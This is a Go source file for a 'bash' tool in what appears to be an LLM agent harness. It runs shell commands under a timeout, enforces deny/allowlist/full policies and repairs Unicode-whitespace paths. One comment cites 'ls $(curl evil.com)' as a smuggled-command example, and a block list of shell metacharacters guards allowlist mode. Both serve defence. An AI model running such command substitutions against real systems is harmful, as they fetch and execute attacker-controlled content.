package bash

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"time"
	"github.com/sausheong/harness/tool"
)

// bashAbsPathRE matches absolute-path tokens in a shell command:
//   - inside single quotes: '/...'
//   - inside double quotes: "/..."
//   - bare with optional backslash-escaped chars: /... up to unescaped whitespace
//
// The three alternatives intentionally use distinct capture groups so the
// caller can tell which form matched and re-quote correctly.
var bashAbsPathRE = regexp.MustCompile(`'(/[^']*)'|"(/[^"]*)"|(/(?:[^\s\\]|\\.)+)`)

// resolveBashCommandPaths scans cmd for absolute-path tokens and substitutes
// any that don't exist on disk with their Unicode-whitespace-normalized
// counterparts. Returns the rewritten command and a list of [original, resolved]
// substitution pairs that were made (empty if none).
//
// Substitution uses tool.ResolveExistingPathStrict, which only touches an entry
// when it actually contains Unicode whitespace — preventing wrong substitutions
// on create-style commands like `mkdir /tmp/newdir`.
func resolveBashCommandPaths(cmd string) (string, [][2]string) {
	var subs [][2]string
	out := bashAbsPathRE.ReplaceAllStringFunc(cmd, func(match string) string {
		groups := bashAbsPathRE.FindStringSubmatch(match)
		var raw string
		switch {
		case groups[1] != "":
			raw = groups[1]
		case groups[2] != "":
			raw = groups[2]
		case groups[3] != "":
			raw = unescapeBashToken(groups[3])
		}
		if raw == "" {
			return match
		}
		resolved := tool.ResolveExistingPathStrict(raw)
		if resolved == raw {
			return match
		}
		subs = append(subs, [2]string{raw, resolved})
		return shellSingleQuote(resolved)
	})
	return out, subs
}

// shellSingleQuote wraps s in single quotes, escaping any embedded single
// quotes via the standard '\'' dance.
func shellSingleQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// unescapeBashToken removes single-character backslash escapes so the
// resulting string can be stat()'d against the filesystem.
func unescapeBashToken(s string) string {
	var b strings.Builder
	b.Grow(len(s))
	for i := 0; i < len(s); i++ {
		if s[i] == '\\' && i+1 < len(s) {
			b.WriteByte(s[i+1])
			i++
			continue
		}
		b.WriteByte(s[i])
	}
	return b.String()
}

const defaultBashTimeout = 120 * time.Second

// ExecPolicy controls which commands the bash tool is allowed to execute.
type ExecPolicy struct {
	Level     string   // "deny", "allowlist", "full"
	Allowlist []string // command basenames allowed when Level is "allowlist"
}

// BashTool executes shell commands.
type BashTool struct {
	WorkDir    string
	ExecPolicy *ExecPolicy // nil means "full" (allow everything)
}

type bashInput struct {
	Command string `json:"command"`
	Timeout int    `json:"timeout"` // seconds, optional
}

func (t *BashTool) Name() string { return "bash" }

func (t *BashTool) Description() string {
	return "Execute a bash command and return its output. The command runs in a shell with a configurable timeout (default 120 seconds). IMPORTANT: always wrap file paths in double quotes (e.g. cat \"/path/with spaces/file.txt\") so paths containing spaces or special characters survive shell tokenization."
}

func (t *BashTool) Parameters() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"command": {
				"type": "string",
				"description": "The bash command to execute"
			},
			"timeout": {
				"type": "integer",
				"description": "Timeout in seconds (default: 120)"
			}
		},
		"required": ["command"]
	}`)
}

// extractCommands extracts executable names from a bash command string.
// It splits on pipes, semicolons, &&, and || to find each sub-command,
// then takes the first token (the executable) from each.
func extractCommands(cmd string) []string {
	// Split on shell operators
	var parts []string
	remaining := cmd
	for len(remaining) > 0 {
		// Find the earliest operator
		minIdx := len(remaining)
		opLen := 0
		for _, op := range []string{"&&", "||", "|", ";"} {
			if idx := strings.Index(remaining, op); idx != -1 && idx < minIdx {
				minIdx = idx
				opLen = len(op)
			}
		}

		part := strings.TrimSpace(remaining[:minIdx])
		if part != "" {
			parts = append(parts, part)
		}

		if minIdx+opLen >= len(remaining) {
			break
		}
		remaining = remaining[minIdx+opLen:]
	}

	var cmds []string
	for _, part := range parts {
		// Strip leading env vars (e.g., "FOO=bar command")
		for tok := range strings.FieldsSeq(part) {
			if strings.Contains(tok, "=") && !strings.HasPrefix(tok, "-") {
				continue // skip env var assignments
			}
			cmds = append(cmds, filepath.Base(tok))
			break
		}
	}
	return cmds
}

// IsConcurrencySafe returns false — bash runs arbitrary commands with side effects.
func (t *BashTool) IsConcurrencySafe(_ json.RawMessage) bool { return false }

func (t *BashTool) Execute(ctx context.Context, input json.RawMessage) (tool.ToolResult, error) {
	var in bashInput
	if err := json.Unmarshal(input, &in); err != nil {
		return tool.ToolResult{Error: fmt.Sprintf("invalid input: %v", err)}, nil
	}

	if in.Command == "" {
		return tool.ToolResult{Error: "command is required"}, nil
	}

	// Recover from Unicode-whitespace path mismatches the LLM may emit
	// (e.g. ASCII spaces in a filename that on disk uses NBSP). Substitution
	// only fires when the on-disk entry actually contains Unicode whitespace,
	// so create-style commands like `mkdir /tmp/newdir` are unaffected.
	resolvedCmd, pathSubs := resolveBashCommandPaths(in.Command)
	in.Command = resolvedCmd

	// Enforce exec policy
	if t.ExecPolicy != nil {
		switch t.ExecPolicy.Level {
		case "deny":
			return tool.ToolResult{Error: "bash execution is disabled by policy"}, nil
		case "allowlist":
			// Block shell metacharacters that can execute arbitrary code
			// inside an otherwise-allowed command (e.g. ls $(curl evil.com))
			for _, meta := range []string{"$(", "`", "<(", ">(", "${", "\\n"} {
				if strings.Contains(in.Command, meta) {
					return tool.ToolResult{Error: "command contains shell metacharacters not allowed in allowlist mode"}, nil
				}
			}
			cmds := extractCommands(in.Command)
			allowed := make(map[string]bool, len(t.ExecPolicy.Allowlist))
			for _, a := range t.ExecPolicy.Allowlist {
				allowed[a] = true
			}
			for _, cmd := range cmds {
				if !allowed[cmd] {
					return tool.ToolResult{Error: fmt.Sprintf("command %q is not in the exec allowlist", cmd)}, nil
				}
			}
		}
		// "full" or unrecognized: allow everything
	}

	timeout := defaultBashTimeout
	if in.Timeout > 0 {
		timeout = time.Duration(in.Timeout) * time.Second
	}

	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd", "/c", in.Command)
	} else {
		cmd = exec.CommandContext(ctx, "bash", "-c", in.Command)
	}
	if t.WorkDir != "" {
		cmd.Dir = t.WorkDir
	}

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()

	output := stdout.String()
	errOutput := stderr.String()

	notice := pathSubsNotice(pathSubs)

	if err != nil {
		msg := err.Error()
		if ctx.Err() == context.DeadlineExceeded {
			msg = "command timed out"
		}
		if errOutput != "" {
			msg = errOutput
		}
		return tool.ToolResult{
			Output: notice + output,
			Error:  msg,
		}, nil
	}

	if errOutput != "" {
		output += "\nSTDERR:\n" + errOutput
	}

	return tool.ToolResult{Output: notice + output}, nil
}

// pathSubsNotice formats a one-block notice listing any path substitutions
// the bash tool made before exec, so the LLM can see what changed and why.
func pathSubsNotice(subs [][2]string) string {
	if len(subs) == 0 {
		return ""
	}
	var b strings.Builder
	b.WriteString("[harness] adjusted paths in command (Unicode-whitespace recovery):\n")
	for _, s := range subs {
		fmt.Fprintf(&b, "  %q -> %q\n", s[0], s[1])
	}
	b.WriteString("---\n")
	return b.String()
}
